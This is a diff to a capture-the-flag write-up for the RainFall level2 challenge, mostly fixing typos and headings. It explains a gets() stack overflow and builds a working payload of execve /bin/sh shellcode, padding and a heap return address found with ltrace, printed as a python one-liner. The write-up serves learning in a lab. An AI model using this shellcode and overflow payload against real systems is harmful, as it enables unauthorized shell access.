@@ -71,7 +71,7 @@ Here, we find 2 interesting functions: `main` and `p`.
 
 The `main` function calls `p()` then returns.
 
-### p function 
+#### p function 
 
 The `p` function first calls `fflush()` on `stdout` to **flush** any buffered output.
 
@@ -80,7 +80,7 @@ It then calls `gets()` to **read user input** into a **local variable** named `l
 After the input is read, the function performs a **security check** on `unaff_retaddr`.
 This check verifies whether the **return address is located in the memory** range `0xb0000000`.
 If the condition is `true`, the program prints the return address and exits immediately using `_exit(1)`.
-This **proctection prevent execution** from an **certain memory regions**.
+This **protection prevents execution** from **certain memory regions**.
 
 If the check passes, the program **continues normally**. The input is printed using `puts()` then the string is duplicated using `strdup()`.
 
@@ -149,7 +149,7 @@ To solve this, we use an **external payload** called `shellcode`:
 
 A **shellcode** is a **sequence of machine instructions** encoded in hexadecimal. It is not human-readable, and it is **executable by the CPU**.
 
-(this one was taken [from](https://shell-storm.org/shellcode/files/shellcode-841.html))
+(This one was taken form [shell-storm](https://shell-storm.org/shellcode/files/shellcode-841.html).)
 
 ---
 
@@ -158,10 +158,13 @@ A **shellcode** is a **sequence of machine instructions** encoded in hexadecimal
 This shellcode is 21 bytes long, with this we can **define the structure of the payload** :
 ```
 <shellcode> + <buffer overflow> + <shellcode address>
-	21		+ 		59		 	+ 			4				 = 84
+	21	   	+ 		59		        + 			4				 = 84
 ```
 
-The **overflow** must be **80 bytes** instead of 76, because `unaff_retaddr` **corrupts 4 bytes** of the buffer during the `and` **operation**.
+##### Corrupted Bytes
+
+Looking at the stack layout, we need to reach the saved EIP at offset 76, but we add 4 extra bytes to account for the corrupted `unaff_retaddr` zone.
+The `and $0xb0000000, %eax` operation **modifies these 4 bytes**, corrupting part of our payload if we write there.
 
 This behavior can be observed with the following tests:
 
@@ -191,7 +194,8 @@ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaJ�
 ### Find the Shellcode Address
 
 The last piece of information required is the **address of the shellcode** in the memory.
-We can use the return value of `strdup()` which it duplicates the input, which contains the shellcode.
+We can use the return value of `strdup()`, which duplicates the input (containing our shellcode) to the heap and returns its address.
+
 
 ```bash
 level2@RainFall:~$ ltrace ./level2 
@@ -220,7 +224,7 @@ python -c "print '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x
 - `-c` 					: executes the command passed as a string.
 - `print` 				: outputs data to standard output.
 
-## 4. Get The Flag
+## 4. Capture The Flag
 
 ```bash
 level2@RainFall:~$ python -c "print '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'a' * 59 + '\x08\xa0\x04\x08'" > /tmp/p
